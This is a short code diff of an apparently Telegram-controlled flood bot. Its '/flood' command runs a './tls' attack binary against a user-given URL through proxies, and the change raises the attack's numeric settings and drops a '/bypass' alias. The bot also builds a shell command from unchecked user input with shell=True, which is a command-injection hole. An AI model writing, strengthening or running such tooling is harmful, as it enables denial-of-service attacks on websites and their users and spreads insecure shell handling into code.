@@ -87,7 +87,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Chạy tiến trình bằng screen
         subprocess.Popen(
-            f"screen -dmS tls bash -c 'chmod 777 * && ./tls {url} {time} 32 4 proxy.txt'",
+            f"screen -dmS tls bash -c 'chmod 777 * && ./tls {url} {time} 64 5 proxy.txt'",
             shell=True
         )
 
@@ -142,7 +142,6 @@ def main():
     application = ApplicationBuilder().token(token_input).build()
 
     application.add_handler(CommandHandler("flood", attack))
-    application.add_handler(CommandHandler("bypass", attack))
     application.add_handler(CommandHandler("ongoing", ongoing))
     application.add_handler(CommandHandler("help", help_command))
 
